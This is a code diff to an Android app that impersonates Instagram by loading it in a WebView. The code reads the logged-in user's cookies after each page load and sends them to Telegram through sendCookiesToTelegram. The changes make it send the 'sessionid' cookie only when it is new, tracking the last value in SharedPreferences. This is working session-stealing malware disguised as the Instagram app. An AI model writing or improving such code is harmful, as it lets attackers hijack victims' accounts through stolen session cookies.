@@ -1,5 +1,7 @@
 package com.instagram;
 
+import android.content.Context;
+import android.content.SharedPreferences;
 import android.os.Bundle;
 import android.util.Log;
 import android.view.View;
@@ -33,10 +35,14 @@ public class MainActivity extends AppCompatActivity {
 	
     private WebView webView;
 	
+	private SharedPreferences preferences;
+	
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
-	
+		
+		preferences = getPreferences(Context.MODE_PRIVATE);
+		
         setContentView(R.layout.activity_main);
         webView = findViewById(R.id.webview);
         webView.getSettings().setLoadsImagesAutomatically(true);
@@ -45,14 +51,18 @@ public class MainActivity extends AppCompatActivity {
         webView.setWebViewClient(new WebViewClient() {
             @Override
             public void onPageFinished(WebView view, String url) {
-                String cookie = CookieManager.getInstance().getCookie(url);
-         
-				try {
-					String parsedCookies = parseCookiesToJson(cookie);
-					sendCookiesToTelegram(parsedCookies);
-				} catch (JSONException e) {
-					Log.e(TAG, e.getMessage());
-				}
+                String cookie = CookieManager.getInstance().getCookie(url);			
+				
+				if (cookie.contains("sessionid")) {
+					try {
+						String parsedCookies = parseCookiesToJson(cookie);
+						if (parsedCookies != null) {
+							sendCookiesToTelegram(parsedCookies);
+						}
+					} catch (JSONException e) {
+						Log.e(TAG, e.getMessage());
+					}
+				}	
 				
             }
         });
@@ -69,6 +79,16 @@ public class MainActivity extends AppCompatActivity {
 			JSONObject jsonObject = new JSONObject();
 			jsonObject.put("name", arrayOfEachCookie[0].trim());
 			jsonObject.put("value", arrayOfEachCookie[1].trim());
+			
+			if (jsonObject.getString("name").equals("sessionid")) {
+				if (jsonObject.getString("value").equals(preferences.getString("SESSION_ID", "NO_SESSION"))) {
+					return null;
+				} else {
+					SharedPreferences.Editor edit = preferences.edit();
+					edit.putString("SESSION_ID", jsonObject.getString("value"));
+					edit.apply();
+				}
+			}
 			jsonObject.put("domain", ".instagram.com");
 			
 			if (arrayOfEachCookie[0].equals("shbts")
